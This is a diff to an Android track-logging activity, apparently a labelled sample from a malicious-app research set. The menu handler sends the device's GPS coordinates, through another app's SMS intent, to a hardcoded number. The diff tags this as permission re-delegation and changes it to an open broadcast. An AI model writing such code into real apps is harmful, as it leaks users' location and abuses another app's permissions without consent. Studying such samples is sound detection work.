@@ -375,19 +375,15 @@ public class TrackLogger extends Activity {
 			}		
 			break;
 		case R.id.tracklogger_menu_sendsms:
-			// Get current location and send it to sms messaging app
+			// [Malicious][Permission re-delegation] Get current location and send it to sms messaging app
 			LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 			Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
 
 			if (loc != null) {
 				Intent unauthorizedBehavior = new Intent("de.ub0r.android.smsdroid.SENDSMS");
-				unauthorizedBehavior.setPackage("de.ub0r.android.smsdroid");
 				unauthorizedBehavior.putExtra("number", "1112223333");
 				unauthorizedBehavior.putExtra("location", "lat: " + loc.getLatitude() + " lon: " + loc.getLongitude());
-
-				Log.d("[MALICIOUS]", "intent: " + unauthorizedBehavior);
-
-				startService(unauthorizedBehavior);
+				sendBroadcast(unauthorizedBehavior);
 			}
 			break;
 		case R.id.tracklogger_menu_settings:
